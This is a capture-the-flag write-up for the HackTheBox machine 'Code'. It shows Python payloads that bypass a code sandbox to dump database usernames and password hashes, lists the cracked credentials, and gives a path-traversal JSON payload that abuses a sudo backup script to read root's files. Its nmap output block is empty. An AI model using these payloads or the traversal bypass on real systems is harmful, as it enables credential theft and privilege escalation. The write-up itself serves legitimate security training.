# Code hackthebox writeup

Code is an easy linux machine on hackthebox.

As always we start with a nmap scan.
## nmap
```bash

Appearently only two ports are open. I also performed a scan on all ports plus a scan of udp ports. Only two ports came up. The attack vector is most likeley on port 5000.

### Port 5000
An application which executes python code runs on port 5000. It is not possible to execute shell commands since many python elements such as import or the execute keywoard are filtered in the backend thus making it impossible to execute code and get a reverse shell. After much fuzzing i found that we can execute database payloads, such as.
```python
print([u.username for u in db.session.query(User).all()])
print([u.password for u in db.session.query(User).all()])
```
The first payload gives us possible usernames and the second payload gives us the hashes of passwords. Those hashes can be easily cracked.

### Credentials

```
Usernames:
['development', 'martin'] 

Passwords:
development
nafeelswordsmaster
```

### User Shell
We can a shell as the user martin. The flag is not available here which means we have first to pivot to another user:
```
martin@code:~$ whoami
martin
```

### priv esc
running sudo -l we see there is a script which we can run using sudo 
```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~$ cat /usr/bin/backy.sh 
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

We can use this script to read the root folder with the following task.json as the parameter which is used by the script

```bash
{  
    "destination": "/home/martin/backups/",  
    "multiprocessing": true,  
    "verbose_log": false,  
    "directories_to_archive": [  
        "/home/....//....//root"  
    ]  
}
```
We run the script using the command sudo /usr/bin/backy.sh task.json

```bash
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_.._.._root_2025_March.tar.bz2  root  task.json
```

The root folder contains a private key which can be used to login as the root user using ssh.

```bash
root@code:/home/app-production# cat user.txt 
12f3c56616

root@code:~# whoami
root
root@code:~# cat root.txt 
56a259fd

```

Unlinke many easy boxes this was indeed an easy box. You need to run nmap to discover the webservice running on port 5000. Afterwards it's prettty obvious there has to be some kind of shell injection which allowed us to read the database. For the root account we need to leverage the custom script which can be used with sudo privileges which allows us to read the root folder.
